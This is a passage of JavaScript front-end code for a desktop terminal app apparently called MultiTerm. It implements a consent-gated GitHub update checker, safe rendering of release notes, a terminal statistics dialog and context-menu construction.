function closeAbout() {
  elements.aboutOverlay.classList.remove("is-open");
  window.setTimeout(() => {
    elements.aboutOverlay.hidden = true;
  }, 150);
}

/* ---------------- Update checker --------------- */

const UPDATE_REPO = "andrewtheart/multiterm-workbench";
const UPDATE_RELEASE_PAGE = `https://github.com/${UPDATE_REPO}/releases/latest`;
const UPDATE_API_URL = `https://api.github.com/repos/${UPDATE_REPO}/releases/latest`;
const UPDATE_DEFAULT_INTERVAL_HOURS = 6;
const UPDATE_MIN_INTERVAL_HOURS = 1;
const UPDATE_MAX_INTERVAL_HOURS = 168;
const UPDATE_PREFERENCES_ENDPOINT = "/api/update-preferences";

function loadUpdateMeta() {
  try {
    const value = JSON.parse(localStorage.getItem("multiterm.updateCheck") || "{}");
    return value && typeof value === "object" ? value : {};
  } catch {
    return {};
  }
}

function saveUpdateMeta(patch) {
  try {
    localStorage.setItem("multiterm.updateCheck", JSON.stringify({ ...loadUpdateMeta(), ...patch }));
  } catch {
    /* storage unavailable (private mode) — checking still works, just unthrottled */
  }
}

function normalizeUpdateIntervalHours(value) {
  const hours = Math.round(Number(value));
  if (!Number.isFinite(hours)) return UPDATE_DEFAULT_INTERVAL_HOURS;
  return Math.min(UPDATE_MAX_INTERVAL_HOURS, Math.max(UPDATE_MIN_INTERVAL_HOURS, hours));
}

function loadAutomaticUpdatePreferences() {
  const meta = loadUpdateMeta();
  return {
    configured: meta.automaticChecksConfigured === true,
    enabled: meta.automaticChecksConfigured === true && meta.automaticChecksEnabled === true,
    intervalHours: normalizeUpdateIntervalHours(meta.intervalHours)
  };
}

function saveAutomaticUpdatePreferences({ configured, enabled, intervalHours } = {}) {
  const current = loadAutomaticUpdatePreferences();
  const next = {
    configured: configured === undefined ? current.configured : Boolean(configured),
    enabled: enabled === undefined ? current.enabled : Boolean(enabled),
    intervalHours: intervalHours === undefined
      ? current.intervalHours
      : normalizeUpdateIntervalHours(intervalHours)
  };
  saveUpdateMeta({
    automaticChecksConfigured: next.configured,
    automaticChecksEnabled: next.enabled,
    intervalHours: next.intervalHours
  });
  return next;
}

async function loadPersistedAutomaticUpdatePreferences() {
  const response = await fetch(UPDATE_PREFERENCES_ENDPOINT, {
    cache: "no-store",
    headers: { "X-MultiTerm-Request": "Renderer" }
  });
  const result = await response.json();
  if (!response.ok || result?.ok === false) {
    throw new Error(result?.error || `Preference service returned HTTP ${response.status}.`);
  }
  if (!result.preferences) return null;
  return {
    configured: result.preferences.configured === true,
    enabled: result.preferences.configured === true && result.preferences.enabled === true,
    intervalHours: normalizeUpdateIntervalHours(result.preferences.intervalHours)
  };
}

async function persistAutomaticUpdatePreferences(preferences) {
  const response = await fetch(UPDATE_PREFERENCES_ENDPOINT, {
    method: "POST",
    cache: "no-store",
    headers: {
      "Content-Type": "application/json",
      "X-MultiTerm-Request": "Renderer"
    },
    body: JSON.stringify(preferences)
  });
  const result = await response.json();
  if (!response.ok || result?.ok === false) {
    throw new Error(result?.error || `Preference service returned HTTP ${response.status}.`);
  }
  return result.preferences;
}

async function saveAndPersistAutomaticUpdatePreferences(options) {
  const previous = loadAutomaticUpdatePreferences();
  const next = saveAutomaticUpdatePreferences(options);
  try {
    await persistAutomaticUpdatePreferences(next);
    return next;
  } catch (error) {
    saveAutomaticUpdatePreferences(previous);
    throw error;
  }
}

async function hydrateAutomaticUpdatePreferences() {
  const local = loadAutomaticUpdatePreferences();
  let persisted = null;
  try {
    persisted = await loadPersistedAutomaticUpdatePreferences();
  } catch (error) {
    log.warn("app", "Could not load persistent update preferences", {
      error: String(error?.message || error)
    });
  }
  if (persisted?.configured) {
    return saveAutomaticUpdatePreferences(persisted);
  }
  if (local.configured) {
    try {
      await persistAutomaticUpdatePreferences(local);
    } catch (error) {
      log.warn("app", "Could not persist existing update preferences", {
        error: String(error?.message || error)
      });
    }
  }
  return local;
}

function syncAutomaticUpdateControls() {
  const preferences = loadAutomaticUpdatePreferences();
  elements.autoUpdateChecks.checked = preferences.enabled;
  elements.updateCheckIntervalHours.value = String(preferences.intervalHours);
  elements.updateCheckIntervalHours.disabled = !preferences.enabled;
}

function bindUpdateConsent() {
  if (!elements.updateConsentOverlay) return;
  elements.updateConsentEnable.addEventListener("click", acceptAutomaticUpdateChecks);
  elements.updateConsentDecline.addEventListener("click", declineAutomaticUpdateChecks);
}

function openUpdateConsentDialog() {
  if (!elements.updateConsentOverlay) return;
  const preferences = loadAutomaticUpdatePreferences();
  elements.updateConsentInterval.value = String(preferences.intervalHours);
  elements.updateConsentOverlay.hidden = false;
  window.requestAnimationFrame(() => elements.updateConsentOverlay.classList.add("is-open"));
  refreshIcons();
  elements.updateConsentInterval.focus();
}

function closeUpdateConsentDialog() {
  if (!elements.updateConsentOverlay) return;
  elements.updateConsentOverlay.classList.remove("is-open");
  window.setTimeout(() => {
    elements.updateConsentOverlay.hidden = true;
  }, 150);
}

async function acceptAutomaticUpdateChecks() {
  elements.updateConsentEnable.disabled = true;
  elements.updateConsentDecline.disabled = true;
  try {
    await saveAndPersistAutomaticUpdatePreferences({
      configured: true,
      enabled: true,
      intervalHours: elements.updateConsentInterval.value
    });
    syncAutomaticUpdateControls();
    closeUpdateConsentDialog();
    startAutomaticUpdateChecks({ checkNow: true });
  } catch (error) {
    log.error("app", "Could not save update preferences", { error: String(error?.message || error) });
    toast("Update preference could not be saved.", "error", 4000);
  } finally {
    elements.updateConsentEnable.disabled = false;
    elements.updateConsentDecline.disabled = false;
  }
}

async function declineAutomaticUpdateChecks() {
  elements.updateConsentEnable.disabled = true;
  elements.updateConsentDecline.disabled = true;
  try {
    await saveAndPersistAutomaticUpdatePreferences({
      configured: true,
      enabled: false,
      intervalHours: elements.updateConsentInterval.value
    });
    syncAutomaticUpdateControls();
    stopAutomaticUpdateChecks();
    closeUpdateConsentDialog();
  } catch (error) {
    log.error("app", "Could not save update preferences", { error: String(error?.message || error) });
    toast("Update preference could not be saved.", "error", 4000);
  } finally {
    elements.updateConsentEnable.disabled = false;
    elements.updateConsentDecline.disabled = false;
  }
}

// Numeric-segment compare; release tags are plain vMAJOR.MINOR.PATCH.
function compareAppVersions(a, b) {
  const parse = (value) => String(value ?? "")
    .trim()
    .replace(/^v/i, "")
    .split(/[.+-]/)
    .map((part) => Number.parseInt(part, 10))
    .filter((part) => Number.isFinite(part));
  const left = parse(a);
  const right = parse(b);
  const length = Math.max(left.length, right.length);
  for (let i = 0; i < length; i += 1) {
    const l = left[i] ?? 0;
    const r = right[i] ?? 0;
    if (l !== r) return l > r ? 1 : -1;
  }
  return 0;
}

function pickInstallerAsset(assets) {
  const list = Array.isArray(assets) ? assets : [];
  const executables = list.filter((asset) => /\.exe$/i.test(asset?.name || "") && asset?.browser_download_url);
  const installer = executables.find((asset) => /setup|install/i.test(asset.name)) || executables[0];
  if (!installer) return null;
  return {
    digest: typeof installer.digest === "string" ? installer.digest.toLowerCase() : "",
    name: installer.name,
    url: installer.browser_download_url,
    size: Number(installer.size) || 0
  };
}

// Browser fallback (the PowerShell bridge runs MultiTerm as a plain web app, with
// no Electron main process to ask). GitHub's API is CORS-enabled, so the *check*
// works everywhere; only the download hand-off needs Electron.
async function fetchLatestReleaseViaFetch() {
  const response = await fetch(UPDATE_API_URL, { headers: { Accept: "application/vnd.github+json" } });
  if (!response.ok) throw new Error(`GitHub returned HTTP ${response.status}.`);
  const data = await response.json();
  const tag = String(data?.tag_name || "");
  return {
    ok: true,
    current: APP_VERSION,
    release: {
      tag,
      version: tag.replace(/^v/i, ""),
      name: data?.name || tag,
      notes: typeof data?.body === "string" ? data.body : "",
      url: data?.html_url || UPDATE_RELEASE_PAGE,
      publishedAt: data?.published_at || "",
      asset: pickInstallerAsset(data?.assets)
    },
    releasePage: UPDATE_RELEASE_PAGE,
    available: Boolean(tag) && compareAppVersions(tag.replace(/^v/i, ""), APP_VERSION) > 0
  };
}

async function requestLatestRelease() {
  if (window.multiterm && typeof window.multiterm.checkForUpdate === "function") {
    return window.multiterm.checkForUpdate();
  }
  return fetchLatestReleaseViaFetch();
}

async function checkForUpdates({ manual = false } = {}) {
  if (state.update.checking) return;
  state.update.checking = true;
  if (manual) toast("Checking for updates\u2026", "info", 1600);

  try {
    const result = await requestLatestRelease();
    saveUpdateMeta({ lastCheck: Date.now() });

    if (!result || result.ok === false) {
      const message = result?.error || "Could not reach GitHub.";
      log.warn("app", `Update check failed: ${message}`);
      if (manual) toast(`Update check failed: ${message}`, "error", 4000);
      return;
    }

    const release = result.release || {};
    if (!result.available) {
      log.info("app", `Update check: already on the latest version (${APP_VERSION})`);
      if (manual) toast(`MultiTerm ${APP_VERSION} is up to date.`, "success", 2600);
      return;
    }

    log.info("app", `Update available: ${release.version}`, { current: result.current || APP_VERSION });
    // An automatic check never re-opens a dialog the user already dismissed for
    // this exact version; a manual check always shows it.
    if (!manual && loadUpdateMeta().dismissedVersion === release.version) return;
    openUpdateDialog(release);
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    log.warn("app", `Update check failed: ${message}`);
    if (manual) toast(`Update check failed: ${message}`, "error", 4000);
  } finally {
    state.update.checking = false;
  }
}

function stopAutomaticUpdateChecks() {
  state.update.scheduleGeneration += 1;
  window.clearTimeout(state.update.timer);
  state.update.timer = null;
}

function scheduleNextAutomaticUpdateCheck(generation = state.update.scheduleGeneration) {
  if (generation !== state.update.scheduleGeneration) return;
  const preferences = loadAutomaticUpdatePreferences();
  if (!preferences.enabled) return;
  const delay = preferences.intervalHours * 60 * 60 * 1000;
  state.update.timer = window.setTimeout(async () => {
    state.update.timer = null;
    await checkForUpdates({ manual: false });
    scheduleNextAutomaticUpdateCheck(generation);
  }, delay);
}

function startAutomaticUpdateChecks({ checkNow = true } = {}) {
  stopAutomaticUpdateChecks();
  if (!loadAutomaticUpdatePreferences().enabled) return;
  const generation = state.update.scheduleGeneration;
  if (!checkNow) {
    scheduleNextAutomaticUpdateCheck(generation);
    return;
  }
  Promise.resolve(checkForUpdates({ manual: false }))
    .finally(() => scheduleNextAutomaticUpdateCheck(generation));
}

async function initializeAutomaticUpdateChecks() {
  // Automated browser runs invoke this flow explicitly. Suppressing unsolicited
  // first-run UI and network traffic keeps unrelated tests deterministic.
  if (navigator.webdriver) return;
  const preferences = await hydrateAutomaticUpdatePreferences();
  if (!preferences.configured) {
    openUpdateConsentDialog();
    return;
  }
  if (preferences.enabled) startAutomaticUpdateChecks({ checkNow: true });
}

function openUpdateDialog(release) {
  if (!elements.updateOverlay) return;
  closePalette();
  state.update.release = release;

  elements.updateSubtitle.textContent = `MultiTerm ${release.version} is available \u2014 you have ${APP_VERSION}.`;
  elements.updateViewRelease.href = release.url || UPDATE_RELEASE_PAGE;
  renderReleaseNotes(release.notes);

  elements.updateError.hidden = true;
  elements.updateError.textContent = "";
  elements.updateProgress.hidden = true;
  elements.updateProgressBar.style.width = "0%";
  elements.updateInstall.disabled = false;
  state.update.downloading = false;

  // Without an Electron main process we cannot download and launch an installer,
  // so the primary action becomes "open the release page".
  const canInstall = Boolean(window.multiterm?.downloadUpdate) && Boolean(release.asset);
  elements.updateInstall.textContent = canInstall ? "Download & install" : "Open download page";

  elements.updateOverlay.hidden = false;
  window.requestAnimationFrame(() => elements.updateOverlay.classList.add("is-open"));
  refreshIcons();
  elements.updateInstall.focus();
}

function closeUpdateDialog() {
  if (!elements.updateOverlay) return;
  elements.updateOverlay.classList.remove("is-open");
  window.setTimeout(() => {
    elements.updateOverlay.hidden = true;
  }, 150);
}

function dismissUpdateDialog() {
  // Downloading is a hand-off to the installer; don't let a stray Escape hide it.
  if (state.update.downloading) return;
  if (state.update.release?.version) saveUpdateMeta({ dismissedVersion: state.update.release.version });
  closeUpdateDialog();
}

// Release bodies are attacker-controllable text from a network response, so they
// are rendered by building DOM nodes from a tiny markdown subset. Nothing here
// ever assigns innerHTML.
function renderReleaseNotes(markdown) {
  const host = elements.updateNotes;
  host.textContent = "";

  const lines = String(markdown || "").replace(/\r\n/g, "\n").split("\n");
  if (!lines.some((line) => line.trim())) {
    const empty = document.createElement("p");
    empty.className = "update-notes-empty";
    empty.textContent = "This release has no notes.";
    host.append(empty);
    return;
  }

  let list = null;
  let paragraph = null;
  const flushParagraph = () => {
    if (paragraph) host.append(paragraph);
    paragraph = null;
  };
  const flushList = () => {
    if (list) host.append(list);
    list = null;
  };

  for (const raw of lines) {
    const line = raw.trimEnd();
    const trimmed = line.trim();

    if (!trimmed) {
      flushParagraph();
      flushList();
      continue;
    }

    const heading = /^#{1,6}\s+(.*)$/.exec(trimmed);
    if (heading) {
      flushParagraph();
      flushList();
      const node = document.createElement("h3");
      appendInlineMarkdown(node, heading[1]);
      host.append(node);
      continue;
    }

    const bullet = /^[-*+]\s+(.*)$/.exec(trimmed);
    if (bullet) {
      flushParagraph();
      if (!list) list = document.createElement("ul");
      const item = document.createElement("li");
      appendInlineMarkdown(item, bullet[1]);
      list.append(item);
      continue;
    }

    flushList();
    if (!paragraph) paragraph = document.createElement("p");
    else paragraph.append(document.createElement("br"));
    appendInlineMarkdown(paragraph, trimmed);
  }

  flushParagraph();
  flushList();
}

// Supports `code`, **bold** and bare URLs. Links become plain text with an href
// only when they are https, so a release body can't smuggle in a javascript: URL.
function appendInlineMarkdown(node, text) {
  const pattern = /`([^`]+)`|\*\*([^*]+)\*\*|(https?:\/\/[^\s)]+)/g;
  let index = 0;
  let match = pattern.exec(text);

  while (match) {
    if (match.index > index) node.append(document.createTextNode(text.slice(index, match.index)));
    if (match[1] !== undefined) {
      const code = document.createElement("code");
      code.textContent = match[1];
      node.append(code);
    } else if (match[2] !== undefined) {
      const strong = document.createElement("strong");
      strong.textContent = match[2];
      node.append(strong);
    } else {
      const url = match[3];
      if (/^https:\/\//i.test(url)) {
        const link = document.createElement("a");
        link.href = url;
        link.target = "_blank";
        link.rel = "noopener noreferrer";
        link.textContent = url;
        node.append(link);
      } else {
        node.append(document.createTextNode(url));
      }
    }
    index = match.index + match[0].length;
    match = pattern.exec(text);
  }

  if (index < text.length) node.append(document.createTextNode(text.slice(index)));
}

async function startUpdateDownload() {
  const release = state.update.release;
  if (!release || state.update.downloading) return;

  const canInstall = Boolean(window.multiterm?.downloadUpdate) && Boolean(release.asset);
  if (!canInstall) {
    openReleasePage(release.url);
    return;
  }

  state.update.downloading = true;
  elements.updateInstall.disabled = true;
  elements.updateLater.disabled = true;
  elements.updateError.hidden = true;
  elements.updateProgress.hidden = false;
  elements.updateProgressBar.style.width = "0%";
  elements.updateProgressText.textContent = `Downloading ${release.asset.name}\u2026`;

  const result = await window.multiterm.downloadUpdate(
    release.asset,
    state.settings.maxInstallerSizeMb
  );
  if (result?.ok) {
    elements.updateProgressText.textContent = "Starting the installer\u2014 MultiTerm will close.";
    return;
  }

  state.update.downloading = false;
  elements.updateInstall.disabled = false;
  elements.updateLater.disabled = false;
  elements.updateProgress.hidden = true;
  elements.updateError.hidden = false;
  elements.updateError.textContent = result?.error || "The update could not be downloaded.";
  log.error("app", `Update download failed: ${elements.updateError.textContent}`);
}

function openReleasePage(url) {
  const target = url || UPDATE_RELEASE_PAGE;
  if (window.multiterm && typeof window.multiterm.openReleasePage === "function") {
    window.multiterm.openReleasePage(target);
  } else {
    window.open(target, "_blank", "noopener");
  }
}

function updateDownloadProgress({ received = 0, total = 0 } = {}) {
  if (!state.update.downloading) return;
  if (total > 0) {
    const percent = Math.min(100, Math.round((received / total) * 100));
    elements.updateProgressBar.style.width = `${percent}%`;
    elements.updateProgressText.textContent = `Downloading\u2026 ${percent}% (${formatBytes(received)} of ${formatBytes(total)})`;
  } else {
    elements.updateProgressText.textContent = `Downloading\u2026 ${formatBytes(received)}`;
  }
}

function bindUpdateDialog() {
  if (!elements.updateOverlay) return;

  elements.updateClose.addEventListener("click", dismissUpdateDialog);
  elements.updateLater.addEventListener("click", dismissUpdateDialog);
  elements.updateInstall.addEventListener("click", startUpdateDownload);
  elements.updateViewRelease.addEventListener("click", (event) => {
    event.preventDefault();
    openReleasePage(state.update.release?.url);
  });
  elements.updateOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.updateOverlay) dismissUpdateDialog();
  });

  window.multiterm?.onUpdateProgress?.(updateDownloadProgress);
}

function formatStatisticCount(value) {
  return Math.max(0, Number(value) || 0).toLocaleString();
}

function formatStatisticCpu(value) {
  return value === null || value === undefined ? "Unavailable" : `${Math.max(0, Number(value) || 0).toFixed(1)}%`;
}

function formatStatisticMemory(value) {
  return value === null || value === undefined ? "Unavailable" : formatBytes(value);
}

function createStatisticMetric(label, value, title) {
  const metric = document.createElement("div");
  metric.className = "statistics-metric";
  if (title) metric.title = title;

  const caption = document.createElement("span");
  caption.className = "statistics-metric-label";
  caption.textContent = label;
  const result = document.createElement("span");
  result.className = "statistics-metric-value";
  result.textContent = value;
  metric.append(caption, result);
  return metric;
}

function buildStatisticsSummary(statistics) {
  const summary = document.createElement("div");
  summary.className = "statistics-summary";
  summary.append(
    createStatisticMetric("Keystrokes in", formatStatisticCount(statistics.keystrokesIn), "Character units sent into the terminal"),
    createStatisticMetric("Keystrokes out", formatStatisticCount(statistics.keystrokesOut), "Character units received from the terminal"),
    createStatisticMetric("Bridge bytes in", formatBytes(statistics.bytesIn), "UTF-8 terminal payload bytes sent through the bridge"),
    createStatisticMetric("Bridge bytes out", formatBytes(statistics.bytesOut), "UTF-8 terminal payload bytes received through the bridge"),
    createStatisticMetric("CPU now", formatStatisticCpu(statistics.cpuPercent), "Point-in-time use by the terminal process tree"),
    createStatisticMetric("Memory now", formatStatisticMemory(statistics.memoryBytes), "Working set of the terminal process tree")
  );
  return summary;
}

function createStatisticsTable(sessions) {
  const wrap = document.createElement("div");
  wrap.className = "statistics-table-wrap";
  const table = document.createElement("table");
  table.className = "statistics-table";
  const head = document.createElement("thead");
  const headRow = document.createElement("tr");
  for (const label of ["Terminal", "Keys in", "Keys out", "Bytes in", "Bytes out", "CPU", "Memory"]) {
    const cell = document.createElement("th");
    cell.scope = "col";
    cell.textContent = label;
    headRow.append(cell);
  }
  head.append(headRow);

  const body = document.createElement("tbody");
  for (const session of sessions) {
    const row = document.createElement("tr");
    const values = [
      session.title || session.id || "Terminal",
      formatStatisticCount(session.keystrokesIn),
      formatStatisticCount(session.keystrokesOut),
      formatBytes(session.bytesIn),
      formatBytes(session.bytesOut),
      formatStatisticCpu(session.cpuPercent),
      formatStatisticMemory(session.memoryBytes)
    ];
    values.forEach((value, index) => {
      const cell = document.createElement("td");
      cell.textContent = value;
      if (index === 0) cell.title = `${session.title || session.id || "Terminal"} (PID ${Number(session.pid) || 0})`;
      row.append(cell);
    });
    body.append(row);
  }
  table.append(head, body);
  wrap.append(table);
  return wrap;
}

function renderStatistics(message) {
  if (!elements.statisticsBody) return;
  const sessions = (Array.isArray(message?.sessions) ? message.sessions : []).map((session) => {
    const terminal = state.terminals.get(session.id);
    return terminal ? { ...session, title: terminal.titleInput.value || session.title } : session;
  });
  const terminalScope = message?.scope === "terminal";
  const sampled = message?.generatedAt ? new Date(message.generatedAt) : null;
  const sampledText = sampled && !Number.isNaN(sampled.getTime())
    ? sampled.toLocaleTimeString(undefined, { hour: "numeric", minute: "2-digit", second: "2-digit" })
    : "just now";

  elements.statisticsBody.textContent = "";
  elements.statisticsTitle.textContent = terminalScope ? "Terminal statistics" : "All terminal statistics";

  if (sessions.length === 0) {
    const empty = document.createElement("div");
    empty.className = message?.processError ? "statistics-error" : "statistics-empty";
    empty.textContent = message?.processError || (terminalScope ? "This terminal is no longer active." : "There are no active terminals.");
    elements.statisticsBody.append(empty);
    elements.statisticsSubtitle.textContent = terminalScope ? "No active session" : "0 active terminals";
    return;
  }

  const totals = message?.totals || sessions.reduce((total, session) => ({
    keystrokesIn: total.keystrokesIn + (Number(session.keystrokesIn) || 0),
    keystrokesOut: total.keystrokesOut + (Number(session.keystrokesOut) || 0),
    bytesIn: total.bytesIn + (Number(session.bytesIn) || 0),
    bytesOut: total.bytesOut + (Number(session.bytesOut) || 0),
    cpuPercent: total.cpuPercent + (Number(session.cpuPercent) || 0),
    memoryBytes: total.memoryBytes + (Number(session.memoryBytes) || 0)
  }), { keystrokesIn: 0, keystrokesOut: 0, bytesIn: 0, bytesOut: 0, cpuPercent: 0, memoryBytes: 0 });
  const selected = terminalScope ? sessions[0] : totals;
  elements.statisticsBody.append(buildStatisticsSummary(selected));

  if (message?.processError) {
    const warning = document.createElement("p");
    warning.className = "statistics-warning";
    warning.textContent = message.processError;
    elements.statisticsBody.append(warning);
  }
  if (!terminalScope) elements.statisticsBody.append(createStatisticsTable(sessions));

  if (terminalScope) {
    const session = sessions[0];
    elements.statisticsSubtitle.textContent = `${session.title || session.id || "Terminal"} \u00b7 PID ${Number(session.pid) || 0} \u00b7 sampled ${sampledText}`;
  } else {
    elements.statisticsSubtitle.textContent = `${sessions.length} active terminal${sessions.length === 1 ? "" : "s"} \u00b7 sampled ${sampledText}`;
  }
}

function setStatisticsLoading(loading) {
  state.statistics.loading = loading;
  if (!elements.statisticsRefresh) return;
  elements.statisticsRefresh.disabled = loading;
  elements.statisticsRefresh.classList.toggle("is-loading", loading);
  elements.statisticsRefresh.setAttribute("aria-busy", String(loading));
}

async function refreshStatistics() {
  if (state.statistics.loading || !elements.statisticsBody) return;
  const generation = ++state.statistics.requestGeneration;
  setStatisticsLoading(true);
  elements.statisticsBody.textContent = "";
  const loading = document.createElement("div");
  loading.className = "statistics-loading";
  loading.textContent = "Sampling terminal process use\u2026";
  elements.statisticsBody.append(loading);

  const request = { type: "statistics" };
  if (state.statistics.terminalId) request.id = state.statistics.terminalId;
  const response = await requestBridge(request, { timeout: 12000 });
  if (generation !== state.statistics.requestGeneration) return;
  setStatisticsLoading(false);

  if (response) {
    renderStatistics(response);
  } else {
    elements.statisticsBody.textContent = "";
    const error = document.createElement("div");
    error.className = "statistics-error";
    error.textContent = "Statistics could not be read from the bridge.";
    elements.statisticsBody.append(error);
  }
}

function openStatistics(terminalId = null) {
  if (!elements.statisticsOverlay) return;
  closePalette();
  state.statistics.returnFocus = document.activeElement instanceof HTMLElement ? document.activeElement : null;
  state.statistics.terminalId = terminalId || null;
  state.statistics.requestGeneration += 1;
  setStatisticsLoading(false);
  elements.statisticsTitle.textContent = terminalId ? "Terminal statistics" : "All terminal statistics";
  elements.statisticsSubtitle.textContent = "Current process use and bridge traffic";
  elements.statisticsOverlay.hidden = false;
  window.requestAnimationFrame(() => elements.statisticsOverlay.classList.add("is-open"));
  refreshStatistics();
  elements.statisticsClose.focus();
}

function closeStatistics() {
  if (!elements.statisticsOverlay) return;
  const returnFocus = state.statistics.returnFocus;
  state.statistics.returnFocus = null;
  state.statistics.requestGeneration += 1;
  setStatisticsLoading(false);
  elements.statisticsOverlay.classList.remove("is-open");
  window.setTimeout(() => {
    elements.statisticsOverlay.hidden = true;
    if (returnFocus && returnFocus.isConnected) returnFocus.focus({ preventScroll: true });
  }, 150);
}

function bindStatisticsDialog() {
  if (!elements.statisticsOverlay) return;
  elements.statisticsClose.addEventListener("click", closeStatistics);
  elements.statisticsRefresh.addEventListener("click", refreshStatistics);
  elements.statisticsOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.statisticsOverlay) closeStatistics();
  });
  elements.statisticsOverlay.addEventListener("keydown", (event) => {
    if (event.key !== "Tab") return;
    const focusable = [elements.statisticsClose, elements.statisticsRefresh].filter((element) => !element.disabled);
    if (focusable.length === 0) return;
    const first = focusable[0];
    const last = focusable[focusable.length - 1];
    if (event.shiftKey && document.activeElement === first) {
      event.preventDefault();
      event.stopPropagation();
      last.focus();
    } else if (!event.shiftKey && document.activeElement === last) {
      event.preventDefault();
      event.stopPropagation();
      first.focus();
    }
  });
}

/* ---------------- Terminal context menu --------------- */

function bindContextMenu() {
  elements.host.addEventListener("contextmenu", (event) => {
    const pane = event.target.closest(".terminal-pane");
    if (!pane) {
      // Blank surface: no pane to act on, so offer the workspace-wide menu.
      showSurfaceContextMenu(event.clientX, event.clientY);
      event.preventDefault();
      return;
    }
    // Let the pane title input use the native editing menu.
    if (event.target.closest(".pane-title")) return;

    const terminal = state.terminals.get(pane.dataset.id);
    if (!terminal) return;

    event.preventDefault();
    openTerminalContextMenu(event, terminal);
  });

  document.addEventListener("pointerdown", (event) => {
    if (!elements.contextMenu.hidden
      && !elements.contextMenu.contains(event.target)
      && !elements.contextSubmenu.contains(event.target)) {
      hideContextMenu();
    }
  });
  // Hover intent for the submenu: leaving the menu arms a short close timer that
  // entering either the menu or the submenu cancels, so the panel survives the
  // pointer sliding across the gap between a row and its submenu.
  elements.contextMenu.addEventListener("pointerleave", scheduleSubmenuClose);
  elements.contextSubmenu.addEventListener("pointerenter", cancelSubmenuClose);
  elements.contextSubmenu.addEventListener("pointerleave", scheduleSubmenuClose);
  // Capture phase so menu navigation wins over xterm's own key handling while the
  // menu is open, and so accelerator keys never fall through to the terminal.
  window.addEventListener("keydown", onContextMenuKeydown, true);
  window.addEventListener("blur", hideContextMenu);
  window.addEventListener("resize", hideContextMenu);
  elements.host.addEventListener("scroll", (event) => {
    if (event.target === elements.host) hideContextMenu();
  }, true);
}

function openTerminalContextMenu(event, terminal) {
  setActiveTerminal(terminal.id);

  const selection = terminal.term.getSelection()
    || terminal.contextSelection
    || terminal.selectionSnapshot;
  const selectionPosition = terminal.term.getSelectionPosition()
    || terminal.selectionSnapshotPosition;

  const action = state.settings.rightClickAction;
  if (action === "paste" || action === "pasteRun") {
    handleRightClickPaste(terminal, action);
  } else {
    showContextMenu(event.clientX, event.clientY, terminal, selection);
    // xterm's own right-click listener can clear the live highlight later in
    // this same event dispatch even though the menu already captured its text.
    // Restore it after propagation completes so the menu and highlight agree.
    if (selection && selectionPosition) {
      terminal.selectionSnapshot = selection;
      terminal.selectionSnapshotPosition = selectionPosition;
      window.queueMicrotask(() => {
        restoreTerminalSelection(terminal);
      });
    }
  }
}

// Offers the other pages plus a "new page" escape hatch, so a pane can always be
// moved somewhere even when only one page exists.
function buildMoveToPageItems(terminal) {
  const others = state.pages.filter((page) => page.id !== terminal.pageId);
  const items = others.map((page) => ({
    label: `Move to ${page.name}`,
    icon: "corner-up-right",
    shortcutId: `terminal.move-page:${page.id}`,
    run: () => moveTerminalToPage(terminal.id, page.id)
  }));
  items.push({
    label: "Move to new page",
    icon: "plus",
    shortcutId: "terminal.move-new-page",
    run: () => {
      const id = addPage({ activate: false });
      moveTerminalToPage(terminal.id, id);
    }
  });
  return items;
}

function buildLoggingMenuItems(terminal) {
  if (!terminal.logging) {
    return [
      { label: "Log to file\u2026", icon: "file-text", shortcutId: "terminal.logging.toggle", run: () => toggleLogging(terminal) },
      ...(terminal.logPath
        ? [{ label: "Reveal last log", icon: "folder-search", shortcutId: "terminal.logging.reveal-last", run: () => sendBridge({ type: "reveal", path: terminal.logPath }) }]
        : [])
    ];
  }

  // While logging, the row names the file being written and offers both opening it
  // and stopping, so the state is legible without leaving the menu.
  const file = logFileName(terminal.logPath);
  return [
    {
      icon: "circle-dot",
      label: `Logging to ${file}. Stop logging`,
      customizationId: "terminal.logging.toggle",
      parts: [
        { text: "Logging to " },
        { text: file, title: terminal.logPath, className: "ctx-link", run: () => openLogFile(terminal) },
        { text: " " },
        { text: "(Stop logging)", className: "ctx-muted", run: () => toggleLogging(terminal) }
      ]
    },
    { label: "Reveal log folder", icon: "folder-search", shortcutId: "terminal.logging.reveal-folder", run: () => sendBridge({ type: "reveal", path: terminal.logPath }) }
  ];
}

function logFileName(logPath) {
  const parts = String(logPath || "").split(/[\\/]/);
  return parts[parts.length - 1] || "log";
}

// The "Command queue" context-menu row carries a hover submenu listing this
// terminal's queued commands, newest first (the queue is stored oldest-first,
// so it is reversed for display). Picking one inserts it into the terminal
// without pressing Enter and removes it from the queue; clicking the row itself
// opens the full notes & queue manager so commands can still be staged there.
//
// The list is capped: a queue is persisted state that can grow without bound (or
// be inflated by a tampered profile), and a menu is the wrong place to render
// thousands of rows. Past the cap the row points at the manager, which pages and
// scrolls properly.
const MAX_QUEUE_SUBMENU_ITEMS = 12;

function buildCommandQueueMenuItem(terminal) {
  const queue = state.terminalArtifacts.terminals[terminal.id]?.queue || [];
  const newestFirst = [...queue].reverse();
  const shown = newestFirst.slice(0, MAX_QUEUE_SUBMENU_ITEMS);
  const submenu = shown.map((entry) => ({
    // Labels are re-filtered on the way to the screen so a stored payload cannot
    // smuggle control characters into the menu even if it bypassed the loader.
    label: sanitizeTerminalCommand(entry.command),
    icon: "terminal",
    title: sanitizeTerminalCommand(entry.command),
    run: () => dequeueTerminalCommand(terminal, entry.id)
  }));
  if (newestFirst.length > shown.length) {
    submenu.push({
      info: true,
      icon: "ellipsis",
      label: `${newestFirst.length - shown.length} more in the queue manager\u2026`
    });
  }
  return {
    label: "Command queue",
    icon: "list-ordered",
    shortcutId: "terminal.command-queue",
    title: "Insert a queued command, or open the queue manager",
    submenu: submenu.length ? submenu : [{ info: true, icon: "inbox", label: "No queued commands" }],
    run: () => openTerminalArtifacts(terminal.id)
  };
}

function stableContextActionToken(value) {
  let hash = 2166136261;
  for (const character of String(value)) {
    hash ^= character.codePointAt(0);
    hash = Math.imul(hash, 16777619);
  }
  return (hash >>> 0).toString(36);
}

function buildContextMenu(terminal, selection = terminal.term.getSelection()) {
  const hasSelection = Boolean(selection);
  const isZoomed = state.zoomedId === terminal.id;
  const snippetItems = (state.settings.snippets || []).slice(0, 8).map((snippet) => ({
    label: snippet.name || snippet.command,
    icon: "terminal",
    shortcutId: `terminal.snippet:${stableContextActionToken(`${snippet.name || ""}\n${snippet.command || ""}`)}`,
    run: () => runSnippet(terminal.id, snippet)
  }));

  const items = [
    { group: "Clipboard", groupId: "clipboard" },
